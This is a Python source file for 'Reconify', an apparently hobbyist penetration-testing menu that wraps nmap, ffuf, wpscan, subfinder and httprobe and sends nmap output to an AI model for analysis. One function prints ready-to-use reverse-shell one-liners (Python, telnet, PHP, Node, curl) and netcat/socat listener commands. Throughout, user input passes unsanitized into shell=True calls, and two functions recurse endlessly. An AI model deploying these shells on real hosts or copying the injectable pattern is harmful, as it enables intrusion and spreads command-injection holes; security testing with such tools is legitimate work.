import subprocess
import os
from datetime import datetime
import requests
from colorama import init, Fore, Back, Style

newpath = r'Reports' 
if not os.path.exists(newpath):
    os.makedirs(newpath)

timestamp = datetime.now().strftime("%d_%m_%Y_%H%M")

def nmap():

    target = input("Enter target (like 192.168.1.1): ")

    print("\nChoose scan type:")
    print("1. Quick scan -T4 -F")
    print("2. Stealth scan sS") 
    print("3. Full scan -sV -sC -A -O ")
    print("4. Find services -sV")
    print("5. Find OS -O")

    choice = input("\nEnter number (1-5): ")

    if choice == "1":
        cmd = f"nmap -T4 -F {target}"  # Quick
    elif choice == "2":
        cmd = f"nmap -sS {target}"  # Stealth
    elif choice == "3":
        cmd = f"nmap -sV -sC -A -O {target}"  # Full
    elif choice == "4":
        cmd = f"nmap -sV {target}"  # Services
    elif choice == "5":
        cmd = f"nmap -O {target}"  # OS
    else:
        print("Wrong choice!")
        exit()

    print(f"\nRunning: {cmd}")
    print("-" * 30)


    with open(f"Reports/nmap_scan_{target}-{timestamp}.txt", "w") as f:
        result = subprocess.run(cmd, shell=True, text=True, capture_output=True)
        f.write(result.stdout)
        print(result.stdout)




def ai_chat():
    print("Get Your sk key from openrouter website and paste that in key.txt file")
    # Get API key
    with open("key.txt", "r") as f:
        api_key = f.read().strip()

    # Get file to analyze
    file_name = input("Enter your Nmap file name: ")

    # Read the file
    with open(file_name, "r") as f:
        nmap_data = f.read()

    def main_menu():
        print("1: Analyze Old Components/Services With Cve's")
        print("2: Analyze Running Services And Attacks")
        print("3: Analyze whats wrong with your scan")
        print("4: Custom Prompt")
        choice = int(input("Input Your Choice: "))
        
        if choice == 1:
            return "Analyze this Scan for Old Components/Services With Cve's if a component is old with a Small warning"
        elif choice == 2:
            return "Analyze Running Services And Possible Attacks"
        elif choice == 3:
            return "Analyze this Nmap scan and tell me what's wrong with it"
        elif choice == 4:
            return input("Enter your custom prompt: ")
        else:
            return "Analyze this Nmap scan"

    # Get the prompt from the menu
    aiprompt = main_menu()
    
    # Send to AI
    response = requests.post(
        "https://openrouter.ai/api/v1/chat/completions",
        headers={
            "Authorization": f"Bearer {api_key}",
            "Content-Type": "application/json"
        },
        json={
            "model": "tngtech/deepseek-r1t2-chimera:free",
            "messages": [
                {
                    "role": "user", 
                    "content": f"{aiprompt}:\n\n{nmap_data}"
                }
            ]
        }
    )

    # Show the result
    result = response.json()
    print("\nAI Analysis:\n")
    print(result['choices'][0]['message']['content'])

    # Run the function
    ai_chat()


def ffuf_scanner():
        print("FFUF Directory/Subdomain Scanner")
        print("=" * 40)
        
        target = input("Enter target URL (like https://example.com or http://192.168.1.1): ")
        
        wordlist = input("Enter wordlist file path: ")
        
        
        print("\nChoose scan type:")
        print("1. Quick directory scan")
        print("2. file/Directory scan with extensions")
        print("3. Subdomain discovery")
        print("4. File fuzzing with extensions")
        
        choice = input("\nEnter number (1-4): ")
        
        if choice == "1":
            cmd = f"ffuf -u {target}/FUZZ -w {wordlist} -mc 200,301,302,403"
            output_file = f"Reports/ffuf_dir_{timestamp}.txt"
        elif choice == "2":
            cmd = f"ffuf -u {target}/FUZZ -w {wordlist} -e .php,.html,.txt -mc 200,301,302,403"
            output_file = f"Reports/ffuf_dir_ext_{timestamp}.txt"
        elif choice == "3":
            cmd = f"ffuf -u {target} -H 'Host: FUZZ.example.com' -w {wordlist} -mc 200,301,302"
            output_file = f"Reports/ffuf_subdomains_{timestamp}.txt"
        elif choice == "4":
            cmd = f"ffuf -u {target}FUZZ -w {wordlist} -e .php,.bak,.txt -mc 200,301,302,403"
            output_file = f"Reports/ffuf_files_{timestamp}.txt"
        else:
            print("Wrong choice!")
            exit()
        
        print(f"\nRunning: {cmd}")
        print("-" * 30)
        
        with open(output_file, "w") as f:
            result = subprocess.run(cmd, shell=True, text=True, capture_output=True)
            f.write(result.stdout)
            print(result.stdout)
 

def wpscan_tool():
    print("WPScan WordPress Scanner")
    print(Fore.RED + "Add wpscan api in wpscankey.txt Before using it" + Style.RESET_ALL)
    print("=" * 40)
    
    target = input("Enter WordPress site URL: ")
    
    # Read API key
    with open("wpscankey.txt", "r") as f:
        api_key = f.read().strip()
    
    
    print("\nChoose scan type:")
    print("1. Basic scan")
    print("2. Full scan")
    print("3. Plugin scan")
    
    choice = input("\nEnter number (1-3): ")
    
    base_cmd = f"wpscan --url {target} --api-token {api_key}"
    
    if choice == "1":
        cmd = f"{base_cmd} --enumerate"
        output_file = f"Reports/wpscan_basic_{timestamp}.txt"
    elif choice == "2":
        cmd = f"{base_cmd} --enumerate vp,vt,u"
        output_file = f"Reports/wpscan_full_{timestamp}.txt"
    elif choice == "3":
        cmd = f"{base_cmd} --enumerate vp"
        output_file = f"Reports/wpscan_plugins_{timestamp}.txt"
    else:
        print("Wrong choice!")
        exit()
    
    print(f"\nRunning: {cmd}")
    print("-" * 30)
    
    with open(output_file, "w") as f:
        result = subprocess.run(cmd, shell=True, text=True, capture_output=True)
        f.write(result.stdout)
        print(result.stdout)

    wpscan_tool()


def shell():

        
    def reverse():
        listen = input("Enter Listener IP: (like 192.168.1.1): ")
        port = input("Listner POrt: ")

        print("\nChoose scan type:")
        print("1. Python RevShell")
        print("2. Telner RevSHell") 
        print("3. PHP RevShell ")
        print("4. Node.js RevShell")
        print("5. Curl Revshell")

        choice = input("\nEnter number (1-5): ")

        if choice == "1":
            print(f"""export RHOST="{listen}";export RPORT={port};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'""")
        elif choice == "2":
            print(f"""TF=$(mktemp -u);mkfifo $TF && telnet {listen} {port} 0<$TF | sh 1>$TF'""")
        elif choice == "3":
            print(f"""php -r '$sock=fsockopen("{listen}",{port});shell_exec("sh <&3 >&3 2>&3");'""")
        elif choice == "4":
            print(f"""require('child_process').exec('nc -e sh {listen} {port}')""")
        elif choice == "5":
            print(f"""C='curl -Ns telnet://{listen}:{port}'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null""")
        elif choice == 6:
            cmd = f""
        else:
            print("Wrong choice!")
            exit()

    def listeners():
        print("1.Netcat Listener (nc)")
        print("2.Socat Listener")
        print("3.PwnCat Python")
        choice = int(input("Which Listner Do you want to run : "))
        port = input("Whice port do you want start Listening: ")

        if choice == 1:
            cmd = f"nc -lvnp {port}"
        elif choice == 2:
            cmd = f"socat -d -d TCP-LISTEN:{port} STDOUT"
        elif choice == 3:
            cmd = f"python3 -m pwncat -lp {port}"

        print(f"Paste This in Your Terminal: {cmd}")




    print("ReverseShell && Listeners")
    print("1: Revshells")
    print("2: Listners")
    firstq = input("Choose Your Option: ")
    if firstq == "1":
        reverse()
    elif firstq == "2":
        listeners()
    else:
        print("Wrong")


def subfinder():
    domain = input("Enter domain (example.com): ")
    
    output_file = f"Reports/subfinder_{domain}_{timestamp}.txt"
    
    print(f"\n Finding subdomains for {domain}...")
    
    cmd = f"subfinder -d {domain} -o {output_file}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    
    if result.stdout:
        print(result.stdout)
    

    if result.stderr:
        print("Errors:", result.stderr)
    

    if os.path.exists(output_file):
        with open(output_file, 'r') as f:
            subdomains = f.readlines()
            count = len(subdomains)
        
        print(f"\n Found {count} subdomains!")
        
def httprobe():
    print("="*50)
    print("First Install httprobe: go install httprobe")
    print("="*50)

    domain_file = input("Enter your domain file: ")
    
    results_file = open(f"Reports/live_results_{timestamp}.txt", "w")
    
    print("\n" + "="*20)
    print("Checking Live Domains...")
    print("="*20)
    
    cmd = f"cat {domain_file} | httprobe"
    
    # 4. Show real-time results
    count = 0
    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, text=True)
    
    for line in process.stdout:
        if line.strip():  # If line is not empty
            count += 1
            print(f"[{count}] ✅ {line.strip()}")
            results_file.write(line)
    
    # 5. Done
    results_file.close()
    print(f"\n✅ Found {count} live domains!")
    print("📁 Saved to: live_results.txt")



def manu():
    banner = Fore.RED + ''' _______              ______                       __   ______            
    |       \            /      \                     |  \ /      \           
    | $$$$$$$\  ______  |  $$$$$$\  ______   _______   \$$|  $$$$$$\ __    __ 
    | $$__| $$ /      \ | $$   \$$ /      \ |       \ |  \| $$_  \$$|  \  |  \
    | $$    $$|  $$$$$$\| $$      |  $$$$$$\| $$$$$$$\| $$| $$ \    | $$  | $$
    | $$$$$$$\| $$    $$| $$   __ | $$  | $$| $$  | $$| $$| $$$$    | $$  | $$
    | $$  | $$| $$$$$$$$| $$__/  \| $$__/ $$| $$  | $$| $$| $$      | $$__/ $$
    | $$  | $$ \$$     \ \$$    $$ \$$    $$| $$  | $$| $$| $$       \$$    $$
    \$$   \$$  \$$$$$$$  \$$$$$$   \$$$$$$  \$$   \$$ \$$ \$$       _\$$$$$$$
                                                                    |  \__| $$
                                                                    \$$    $$
                                                                    \$$$$$$
            Dev: 0xMush Github: https://github.com/0xMush/Reconify/''' + Style.RESET_ALL
    print(banner)
    print(Back.GREEN + "1: Nmap"+ Style.RESET_ALL)
    print(Back.GREEN + "2: Nmap Scan Ai Analyzer" + Style.RESET_ALL )
    print(Back.GREEN + "3: FFUF (directry/subdomain/files Bruteforce Tool)" + Style.RESET_ALL)
    print(Back.GREEN + "4: WPscan (usage with api)" + Style.RESET_ALL)
    print(Back.GREEN + "5: RevShells & Listeners" + Style.RESET_ALL)
    print(Back.GREEN + "6: Subfinder (Find Subdomains)" + Style.RESET_ALL)
    print(Back.GREEN + "7: Httprobe (Check Valid Subdomains)" + Style.RESET_ALL)

    choice = int(input(Fore.BLUE + "Select A Tool To Use: "))

    if choice == 1:
        nmap()
    elif choice == 2:
        ai_chat()
    elif choice == 3:
        ffuf_scanner()  
    elif choice == 4:
        wpscan_tool()
    elif choice == 5:
        shell()
    elif choice == 6:
    	subfinder()
    elif choice == 7:
        httprobe()
    

manu()
